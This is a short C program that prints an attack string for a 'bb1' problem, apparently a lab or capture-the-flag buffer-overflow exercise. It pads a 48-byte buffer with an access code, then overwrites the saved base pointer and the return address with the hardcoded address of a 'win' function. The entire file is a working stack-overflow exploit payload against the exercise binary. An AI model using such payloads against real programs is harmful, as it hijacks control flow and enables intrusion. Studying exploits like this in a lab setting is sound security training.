#include <stdio.h>
#include <stdlib.h>

/**
 * Outputs attack string for bb1 problem. Assumes the host architecture is
 * little endian.
 */
int main(void)
{
    char access_code[48] = "Sup3rs3cr3tC0de";
    void *rbp = (void *)0x7fffffffde90;
    void *win = (void *)0x401172;

    fwrite(access_code, 1, sizeof(access_code), stdout);
    fwrite(&rbp, sizeof(rbp), 1, stdout);
    fwrite(&win, sizeof(win), 1, stdout);
    fputc('\n', stdout);

    return EXIT_SUCCESS;
}
